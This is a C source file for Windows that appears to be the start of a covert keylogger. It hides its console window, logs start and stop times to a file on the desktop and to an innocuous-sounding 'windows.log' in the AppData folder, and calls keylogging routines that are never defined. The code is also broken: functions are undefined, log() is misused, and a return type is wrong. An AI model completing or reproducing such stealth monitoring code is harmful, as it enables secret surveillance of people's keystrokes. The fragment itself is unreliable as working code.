#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
#include <stdlib.h>
// not gonna find comments here.
bool invisible = true;
char fileName[MAX_PATH];

void hide(void)
{
    HWND stealth;

   
    stealth = FindWindow("ConsoleWindowClass", NULL );
    ShowWindow(stealth, 0);
}

void init(void)
{
    
    char* dest = "C:\\users\\Potato\\desktop\\log.log";

    
    ExpandEnvironmentStrings(dest, fileName, MAX_PATH);

  
    FILE *file;
    file = fopen(fileName, "a+");
    time_t startTime = time(0);
   
    long savedOffset = ftell(file);
    fseek(file, 0, SEEK_END);
    if (!ftell(file) == 0) fputc('\n', file);
    fseek(file, savedOffset, SEEK_SET);

    int ver;
    ver = 1;
    log(ver);
    fputs("### Started logging at: ", file);
    fputs(ctime(&startTime), file);
    fclose(file);
}

void powerdown(void)
{
    
    char* dest = "%appdata%\\windows.log";
    ExpandEnvironmentStrings(dest, fileName, MAX_PATH);

   
    FILE *file;
    file = fopen(fileName, "a+");
    time_t endTime = time(0);
    fputs("\n### Stopped logging at: ", file);
    fputs(ctime(&endTime), file);
    fclose(file);
}

char getFileName()
{
    return fileName;
}

int main(int argc, char* argv[])
{
    int startKeyLogging(char* argv[]);
    if (invisible) hide();
    init();
    start(argv);
    atexit(powerdown);  
}
